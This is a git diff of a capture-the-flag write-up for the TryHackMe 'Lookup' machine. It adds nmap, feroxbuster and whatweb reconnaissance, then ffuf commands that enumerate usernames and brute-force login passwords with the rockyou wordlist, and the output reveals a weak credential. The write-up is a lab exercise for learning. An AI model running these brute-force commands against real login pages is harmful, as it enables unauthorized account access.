@@ -1,15 +1,17 @@
 # Lookup
 
+This is first machine i did at Tryhackme
+
 ### Host Information Gathering
 
 ### Add host to /etc/hosts
 ```
-echo "10.10.80.211 lookup.thm" | sudo tee -a /etc/hosts
+echo "10.80.183.237 lookup.thm" | sudo tee -a /etc/hosts
 ```
 
 <img width="646" height="313" alt="image" src="https://github.com/user-attachments/assets/4ad31f30-1fbc-443c-90aa-468e55ddf4eb" />
 
-### Nmap
+### Nmap:
 
 ```
 [ Oguri ~ ]$ nmap -sC -sV 10.80.183.237
@@ -34,7 +36,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
 
 ## Web Information Gathering
 
-### Fuzzing
+### Fuzzing:
 ```
 [ Oguri ~ ]$ feroxbuster --url http://lookup.thm/ -w /home/caffra/Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
                                                                                                                                                                                   
@@ -63,10 +65,115 @@ by Ben "epi" Risher 🤓                 ver: 2.13.0
 200      GET       26l       50w      719c http://lookup.thm/
 ```
 
-### Whatweb
+### Whatweb:
 ```
 [ Oguri ~ ]$ whatweb 10.80.183.237
 ERROR Opening: https://10.80.183.237 - Connection refused - connect(2) for "10.80.183.237" port 443
 http://10.80.183.237 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.183.237], RedirectLocation[http://lookup.thm]
 http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.183.237], PasswordField[password], Title[Login Page]
 ```
+
+## Brute-Force
+At website first thing we can so is login page soo we can try use it
+<img width="2218" height="571" alt="image" src="https://github.com/user-attachments/assets/806a59be-607f-4e33-9e38-288113886e7e" />
+
+### FFUF:
+```
+[ Oguri ~ ]$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=test' -w /home/caffra/Wordlists/SecLists/Usernames/Names/names.txt -t 10 -mc all -fs 74
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://lookup.thm/login.php
+ :: Wordlist         : FUZZ: /home/caffra/Wordlists/SecLists/Usernames/Names/names.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=FUZZ&password=test
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 10
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 74
+________________________________________________
+
+admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 40ms]
+jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 43ms]
+:: Progress: [10713/10713] :: Job [1/1] :: 230 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
+```
+Like that we got two users
+- **admin**
+- **jose**
+
+```
+[ Oguri ~ ]$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /home/caffra/Wordlists/rockyou.txt  -t 10 -mc all -fs 62
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://lookup.thm/login.php
+ :: Wordlist         : FUZZ: /home/caffra/Wordlists/rockyou.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=jose&password=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 10
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 62
+________________________________________________
+
+password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
+```
+Jose has **password123** as password
+
+```
+[ Oguri ~ ]$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=admin&password=FUZZ' -w /home/caffra/Wordlists/rockyou.txt  -t 10 -mc all -fs 62
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://lookup.thm/login.php
+ :: Wordlist         : FUZZ: /home/caffra/Wordlists/rockyou.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=admin&password=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 10
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 62
+________________________________________________
+
+password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 44ms]
+```
+## After Brute-force
+We can see website redirect to **http://files.lookup.thm** so its good idea to **add it to /etc/hosts**
+<img width="1877" height="381" alt="image" src="https://github.com/user-attachments/assets/6dd87315-dcf9-422e-8d3b-fa4a914f3506" />
+
+and like that we got it 
+<img width="2254" height="373" alt="image" src="https://github.com/user-attachments/assets/4e0cfb97-959b-4677-a946-24325cb71ce5" />
+
